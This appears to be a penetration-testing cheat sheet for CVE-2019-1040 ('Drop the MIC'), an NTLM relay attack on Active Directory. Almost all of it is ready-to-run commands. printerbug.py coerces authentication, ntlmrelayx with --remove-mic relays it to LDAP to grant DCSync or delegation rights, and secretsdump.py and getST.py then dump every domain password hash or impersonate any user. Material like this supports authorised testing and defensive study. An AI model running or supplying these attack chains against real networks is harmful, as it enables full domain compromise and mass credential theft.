# Drop the MIC CVE-2019-1040

### The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP

#### 1) Check vulnerability with cve-2019-1040-scanner https://github.com/fox-it/cve-2019-1040-scanner

    python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'

### Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD

    python printerbug.py testsegment.local/username@s2012exc.testsegment.local (Terminal 1)

    ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local (Terminal 2)

    secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc (Terminal 1)

### Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.

    ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access (Create new machine account)

    python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6 (Terminal 2)

    getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD'

### Connect using the ticket

    export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache

    secretsdump.py -k -no-pass second-dc-server.local -just-dc

